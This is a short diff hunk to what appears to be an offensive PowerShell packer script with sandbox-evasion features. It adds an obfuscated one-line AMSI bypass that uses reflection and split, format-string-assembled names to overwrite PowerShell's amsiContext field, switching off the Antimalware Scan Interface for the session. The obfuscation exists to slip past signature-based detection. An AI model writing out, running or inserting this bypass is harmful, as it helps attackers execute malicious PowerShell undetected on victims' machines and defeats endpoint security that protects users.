@@ -33,6 +33,9 @@ Features:
 [*] Basic sandbox evasion techniques (optional -sandbox)
 "
 
+# ''A'''M''S''I''-''B''Y''P''A''S''S''
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($0x00),0x41414141);
+
 function Invoke-PoSH-Packer {
 
     [CmdletBinding()]
